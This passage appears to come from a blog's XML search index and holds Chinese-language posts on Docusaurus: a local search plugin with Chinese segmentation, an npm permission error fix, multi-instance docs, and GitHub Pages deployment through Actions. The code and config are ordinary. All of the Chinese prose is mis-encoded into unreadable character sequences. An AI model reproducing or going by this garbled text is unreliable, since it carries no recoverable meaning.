        <content type="html"><![CDATA[<p>Docusaurus å®˜æ–¹ç»™å‡ºäº†ä¸€ä¸ªæ·»åŠ æœç´¢çš„æ–¹å¼<a href="https://docusaurus.io/zh-CN/docs/search"> Algolia DocSearch</a>ï¼Œä½†æ˜¯è¿™ä¸ªæœç´¢æ’ä»¶éœ€è¦å¾—åˆ°Algoliaå®˜æ–¹çš„è®¤è¯ï¼Œå¦‚æœä½ çš„ç½‘ç«™è¿˜å¤„äºå»ºè®¾é˜¶æ®µï¼Œé‚£ä¹ˆå°±ä¸ä¼šè¢«å…è®¸ä½¿ç”¨ã€‚</p><p>åœ¨ç½‘ä¸Šæœç´¢åå‘ç°äº†<a href="https://github.com/cmfcmf/docusaurus-search-local">search-local</a>çš„æ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶ä¸ºæœ¬åœ°ç¦»çº¿æœç´¢ã€‚</p><ul><li><a href="https://docusaurus.io/feedback/p/offline-search">è¿™é‡Œ</a>æ˜¯å…³äºç¦»çº¿æœç´¢çš„è®¨è®º</li></ul><h2 id="docusaurus-lunr-search-ä½¿ç”¨æ–¹æ³•"><a href="#docusaurus-lunr-search-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="docusaurus-lunr-search ä½¿ç”¨æ–¹æ³•"></a>docusaurus-lunr-search ä½¿ç”¨æ–¹æ³•</h2><h3 id="å®‰è£…æ–¹æ³•"><a href="#å®‰è£…æ–¹æ³•" class="headerlink" title="å®‰è£…æ–¹æ³•"></a>å®‰è£…æ–¹æ³•</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">yarn <span class="hljs-keyword">add</span> <span class="hljs-variable">@cmfcmf</span><span class="hljs-operator">/</span>docusaurus<span class="hljs-operator">-</span><span class="hljs-keyword">search</span><span class="hljs-operator">-</span><span class="hljs-keyword">local</span></span></code></pre></div></div><p>æ³¨æ„ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸­æ˜¯ä¸æ”¯æŒä¸­æ–‡æœç´¢çš„ã€‚åœ¨æŸ¥çœ‹æºç åå‘ç°ï¼Œè¿™ä¸ªæ’ä»¶ä½¿ç”¨çš„æ˜¯<a href="https://github.com/MihaiValentin/lunr-languages">lunr-language</a>æ¥è¿›è¡Œåˆ†è¯çš„ï¼Œ<br>åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­å·²ç»åŒ…å«äº†ä¸­æ–‡åˆ†è¯ï¼Œå¹¶ä¸”ä¾èµ–<a href="https://www.npmjs.com/package/nodejieba">nodejieba</a>ã€‚</p><p>æ‰€ä»¥è¦å†å®‰è£…<code>nodejieba</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">yarn nodejieba</span></span></code></pre></div></div><blockquote><p><code>nodejieba</code>çš„å®‰è£…ä¾èµ–pythonï¼Œå¹¶ä¸”pythonçš„å®‰è£…ç›®å½•ä¸èƒ½æœ‰ä¸­æ–‡<br>å¦‚æœpythonå·²ç»å®‰è£…åˆ°äº†ä¸­æ–‡ç›®å½•ï¼Œé‚£ä¹ˆ<code>npm install nodejieba</code>æ˜¯å¯ä»¥å®‰è£…çš„ï¼Œç„¶å<code>yarn install</code>ã€‚<br>åƒä¸‡åˆ«ç›´æ¥<code>yarn</code>ã€‚è¿™å°†ä¼šå¯¼è‡´ä»£ç æ¡†ä¸­çš„copyæ— æ³•ä½¿ç”¨ã€‚</p></blockquote><h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-coffeescript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.<span class="hljs-built_in">exports</span> = &#123;</span><span class="line">  plugins: [</span><span class="line">    [</span><span class="line">      <span class="hljs-built_in">require</span>.resolve(<span class="hljs-string">&#x27;@cmfcmf/docusaurus-search-local&#x27;</span>),</span><span class="line">      &#123;</span><span class="line">        indexDocs: <span class="hljs-literal">true</span>,</span><span class="line">        indexBlog: <span class="hljs-literal">true</span>,</span><span class="line">        docsRouteBasePath: <span class="hljs-string">&#x27;/doc&#x27;</span>,</span><span class="line">        blogRouteBasePath: <span class="hljs-string">&#x27;/blog&#x27;</span>,</span><span class="line">        language: [<span class="hljs-string">&#x27;en&#x27;</span>, <span class="hljs-string">&#x27;zh&#x27;</span>],</span><span class="line">      &#125;</span><span class="line">    ],</span><span class="line">  ],</span><span class="line">&#125;</span></code></pre></div></div><p>æœ€åç¼–è¯‘ <code>npm run build</code> å³å¯ã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è¿™ä¸ªæ’ä»¶åªèƒ½åœ¨é™æ€é¡µé¢ä¸­ç”Ÿæ•ˆï¼Œä¹Ÿå°±æ˜¯éƒ¨ç½²äº†ä¹‹åæ‰èƒ½çœ‹åˆ°</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">yarn build</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus æŠ¥é”™æ¸…å•</title>
      <link href="/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/"/>
      <url>/2021/06/28/docu%E6%8A%A5%E9%94%99%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="gyp-ERR-stack-Error-EACCES"><a href="#gyp-ERR-stack-Error-EACCES" class="headerlink" title="gyp ERR! stack Error: EACCES"></a>gyp ERR! stack Error: EACCES</h2><ul><li>å‚è€ƒ<a href="https://stackoverflow.com/questions/52231289/gyp-err-stack-error-eacces-permission-denied-mkdir-var-www-project-name-no">è¿™ç¯‡æ–‡ç« </a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">apt install python3 </span><span class="line"></br></span><span class="line">npm install yarn -g</span><span class="line">ln -s <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/node-v14.17.1-linux-x64/</span>bin<span class="hljs-regexp">/yarn /u</span>sr<span class="hljs-regexp">/local/</span>bin/yarn</span><span class="line">ln -s <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/node-v14.17.1-linux-x64/</span>bin<span class="hljs-regexp">/yarnpkg /u</span>sr<span class="hljs-regexp">/local/</span>bin/yarnpkg</span><span class="line"></br></span><span class="line">yarn</span></code></pre></div></div><p>å°½é‡ä½¿ç”¨<code>yarn</code>ä½œä¸ºåŒ…ç®¡ç†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus çš„å¤šå®ä¾‹æ–‡æ¡£éƒ¨ç½²</title>
      <link href="/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/"/>
      <url>/2021/06/23/docu-%E7%9A%84%E5%A4%9A%E5%AE%9E%E4%BE%8B%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>è¦å®ç°å¤šå®ä¾‹æ–‡æ¡£éƒ¨ç½²å…¶å®éå¸¸ç®€å•ï¼ŒæŒ‰ç…§<a href="https://docusaurus.io/zh-CN/docs/docs-multi-instance">å®˜æ–¹æ–‡æ¡£</a>å°±å¯ä»¥æ“ä½œã€‚ä½†æ˜¯é‡Œé¢æœ‰ä¸€äº›å‘éœ€è¦å›é¿ã€‚</p><p>æœ‰ä¸¤ç§éƒ¨ç½²æ–¹å¼ï¼š</p><ol><li>åœ¨<code>doc</code>æ–‡ä»¶å¤¹å†…éƒ¨å†æ·»åŠ æ–‡ä»¶å¤¹ï¼Œè¿™ç§æ–¹å¼å¯ä»¥æ§åˆ¶ç‰ˆæœ¬ã€‚</li><li>åœ¨æ ¹ç›®å½•ä¸‹æ·»åŠ æ–‡ä»¶å¤¹ï¼Œè¿™ç§æ–¹å¼ä¸èƒ½æ§åˆ¶ç‰ˆæœ¬ã€‚</li></ol><p>æœ¬ç¯‡è®²è¿°ç¬¬2ç§æ–¹å¼ã€‚ç¬¬ä¸€ç§æ–¹å¼å¯ä»¥å‚è€ƒ<a href="https://www.gitmemory.com/issue/facebook/docusaurus/3299/675409985">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><h2 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-asciidoc codeBlockLines"><span class="line">docs/</span><span class="line"><span class="hljs-bullet">- </span>doc1.md</span><span class="line">resources/</span><span class="line"><span class="hljs-bullet">- </span>doc2.md</span></code></pre></div></div><p>å¦‚ä¸ŠåŠ å…¥äº†<code>resources</code>æ–‡ä»¶å¤¹ï¼Œé‡Œé¢åŒ…å«äº†<code>doc2.md</code>æ–‡ä»¶ã€‚</p><h2 id="ä¿®æ”¹æ–‡ä»¶"><a href="#ä¿®æ”¹æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹æ–‡ä»¶"></a>ä¿®æ”¹æ–‡ä»¶</h2><p>åœ¨<code>docusaurus.config.js</code>æ–‡ä»¶ä¸­éœ€è¦åšå‡ºå¦‚ä¸‹<strong>æœ€å°</strong>ä¿®æ”¹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockTitle">title="docusaurus.config.js"</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><span class="line">  <span class="hljs-attr">plugins</span>: [</span><span class="line">    [</span><span class="line">      <span class="hljs-string">&#x27;@docusaurus/plugin-content-docs&#x27;</span>,</span><span class="line">      &#123;</span><span class="line">        <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">routeBasePath</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">sidebarPath</span>: <span class="hljs-built_in">require</span>.resolve(<span class="hljs-string">&#x27;./sidebarsResources.js&#x27;</span>),</span><span class="line">        <span class="hljs-comment">// ... å…¶ä»–è®¾ç½®</span></span><span class="line">      &#125;,</span><span class="line">    ],</span><span class="line">  ],</span><span class="line">  <span class="hljs-attr">themeConfig</span>: &#123;</span><span class="line">    <span class="hljs-attr">navbar</span>: &#123;</span><span class="line">      <span class="hljs-attr">items</span>: [&#123;</span><span class="line">      &#123;</span><span class="line marked">        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;/resources/doc2&#x27;</span>,   <span class="hljs-comment">// è¿™é‡Œè¦æŒ‡å®šå…·ä½“çš„indexæ–‡æ¡£</span></span><span class="line">        <span class="hljs-attr">activeBasePath</span>: <span class="hljs-string">&#x27;resources&#x27;</span>,</span><span class="line">        <span class="hljs-attr">label</span>: <span class="hljs-string">&#x27;è¿™é‡Œæ˜¯æ–‡æ¡£2&#x27;</span>,</span><span class="line">        <span class="hljs-attr">position</span>: <span class="hljs-string">&#x27;left&#x27;</span></span><span class="line">      &#125;,</span><span class="line">      &#125;]</span><span class="line">    &#125;</span><span class="line">  &#125;</span><span class="line">&#125;;</span></code></pre></div></div><p>æœ€åæ˜¯å¯¹sidebarsçš„è°ƒæ•´</p><div class="codeBlockContainer"><div class="codeBlockTitle">title='./sidebarsResources.js'</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><span class="line">    <span class="hljs-attr">resources</span>: [&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;autogenerated&#x27;</span>, <span class="hljs-attr">dirName</span>: <span class="hljs-string">&#x27;.&#x27;</span> &#125;],</span><span class="line">&#125;</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ Github Pages éƒ¨ç½² Blog</title>
      <link href="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>è¦ä½¿ç”¨ Github Pages æ¥éƒ¨ç½²åšå®¢ï¼Œé¦–å…ˆéœ€è¦é€‰æ‹©ä½¿ç”¨ä»€ä¹ˆé™æ€æ¡†æ¶ã€‚</p><p>è¿™é‡Œæˆ‘æœ€ç»ˆé€‰æ‹©äº†<a href="https://docusaurus.io/zh-CN/docs">Docusaurus</a></p><p>å¼€å‘ä¸éƒ¨ç½²çš„ç®€è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>ä½¿ç”¨<code>Docusaurus</code>çš„è„šæ‰‹æ¶åˆ›å»ºåˆå§‹é¡¹ç›®</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-swift codeBlockLines"><span class="line">npx <span class="hljs-meta">@docusaurus</span><span class="hljs-operator">/</span><span class="hljs-keyword">init</span><span class="hljs-meta">@latest</span> <span class="hljs-keyword">init</span> my<span class="hljs-operator">-</span>website classic</span></code></pre></div></div></li><li><p>ä¿®æ”¹<code>docusaurus.config.js</code>æ–‡ä»¶ä¸­3ä¸ªé‡è¦å†…å®¹</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line">url: <span class="hljs-string">&#x27;https://elinpf.github.io&#x27;</span>,</span><span class="line"><span class="hljs-attr">organizationName</span>: <span class="hljs-string">&#x27;Elinpf&#x27;</span>, </span><span class="line"><span class="hljs-attr">projectName</span>: <span class="hljs-string">&#x27;elinpf.github.io&#x27;</span>, </span></code></pre></div></div><ol start="3"><li><p>åœ¨Githubä¸Šåˆ›å»ºåŒåä»“åº“<code>Elinpf/Elinpf.github.io</code></p></li><li><p>å‘å¸ƒ<code>master</code>å’Œ<code>gh-pages</code>åˆ†æ”¯</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">git remote add origin https://github.com/Elinpf/Elinpf.github.io.git</span><span class="line">git push origin master</span><span class="line">git branch -M gh-pages</span><span class="line">git push origin gh-pages</span></code></pre></div></div><ol start="5"><li>å°†<code>Setting</code>ä¸­çš„Pageså‘å¸ƒæºæ”¹ä¸º<code>gh-pages</code>åˆ†æ”¯</li></ol><p><img src="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/1.png"></p><ol start="6"><li>å°†<code>Setting</code>ä¸­çš„<code>Secrets</code>æ·»åŠ ä¸€ä¸ª<code>ACCESS_TOKEN</code>(è¿™é‡Œçš„tokenå°±æ˜¯ç”¨æˆ·æˆæƒçš„tokenå€¼ï¼Œ<a href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">å‚è€ƒè¿™é‡Œå¢åŠ æ–°çš„æˆæƒ</a>)</li></ol><p><img src="/2021/06/22/github-pages-%E9%83%A8%E7%BD%B2/2.png"></p><ol start="7"><li>åœ¨é¡¹ç›®ä¸­æ·»åŠ æ–‡ä»¶<code>.github/workflows/docusaurus.yml</code>ï¼Œæ¥å†™Actionç”¨äºè‡ªåŠ¨éƒ¨ç½²ï¼ˆå…·ä½“å«ä¹‰å‚è€ƒ<a href="http://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">è¿™ç¯‡æ–‡ç« </a>ï¼‰</li></ol><div class="codeBlockContainer"><div class="codeBlockTitle">title=".github/workflows/docusaurus.yml"</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">Github</span> <span class="hljs-string">pages</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">build-and-deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">persist-credentials:</span> <span class="hljs-literal">false</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">and</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        npm install</span></span><span class="line"><span class="hljs-string">        npm run-script build </span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@releases/v3</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">ACCESS_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.ACCESS_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">BRANCH:</span> <span class="hljs-string">gh-pages</span></span><span class="line">        <span class="hljs-attr">FOLDER:</span> <span class="hljs-string">build</span></span><span class="line">        <span class="hljs-attr">BUILD_SCRIPT:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span></span></code></pre></div></div><ol start="8"><li>å†æ¬¡æäº¤å°±å¯ä»¥äº†</li></ol>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> docusaurus </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
